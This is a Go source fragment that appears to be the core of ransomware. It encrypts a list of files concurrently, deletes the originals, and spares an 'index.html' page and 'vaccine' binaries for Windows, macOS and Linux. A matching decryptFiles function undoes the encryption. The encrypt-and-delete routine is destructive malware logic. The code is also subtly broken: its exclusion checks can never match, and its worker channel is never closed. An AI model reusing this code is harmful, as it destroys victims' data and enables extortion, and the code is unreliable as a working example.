func encryptFiles(files []string, key string) {
	wg := sync.WaitGroup{}
	c := make(chan string, 1000)
	for i := 0; i < 10; i++ {
		go func(c chan string) {
			defer wg.Done()
			for f := range c {
				err := gfe.EncryptFile(f, key)
				if err != nil {
					fmt.Printf("Erro %v", err)
					return
				}
				err = os.Remove(f)
				if err != nil {
					fmt.Printf("Erro %v", err)
				}
				<-time.After(time.Second)
			}
		}(c)
		wg.Add(1)
	}
	for _, f := range files {
		if ok, err := regexp.MatchString(".encrypt", f); err != nil && ok {
			continue
		}
		if ok, err := regexp.MatchString("index.html", f); err != nil && ok {
			continue
		}
		if ok, err := regexp.MatchString("index.html", f); err != nil && ok {
			continue
		}
		if ok, err := regexp.MatchString("vaccine-windows.exe", f); err != nil && ok {
			continue
		}
		if ok, err := regexp.MatchString("vaccine-osx", f); err != nil && ok {
			continue
		}
		if ok, err := regexp.MatchString("vaccine-linux", f); err != nil && ok {
			continue
		}
		c <- f
	}
	wg.Wait()
}

func decryptFiles(files []string, key string) {
	wg := sync.WaitGroup{}
	for _, f := range files {
		wg.Add(1)
		go func() {
			defer wg.Done()
			err := gfe.DecryptFile(f, key)
			if err != nil {
				fmt.Printf("Erro %v", err)
				return
			}
			err = os.Remove(f)
			if err != nil {
				fmt.Printf("Erro %v", err)
			}
		}()
	}
	wg.Wait()
}

